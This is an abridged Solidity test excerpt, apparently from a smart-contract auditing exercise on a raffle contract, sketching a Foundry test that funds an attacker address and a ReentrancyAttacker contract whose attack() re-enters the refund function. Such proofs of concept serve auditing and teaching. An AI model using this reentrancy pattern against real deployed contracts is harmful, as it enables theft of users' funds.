...
contract PuppyRaffleTest is Test {
    ...
    function test_reentrancyRefund() public {
        ...
        address attackUser = makeAddr("attackUser"); // create an attacker user
        vm.deal(attackUser, 1 ether); // give our attacker some money
...
contract ReentrancyAttacker {
    ...
    function attack() external payable {
        ...
        puppyRaffle.refund(attackerIndex); // refund function will call back to us with sendValue, where we will call back to refund again
    }
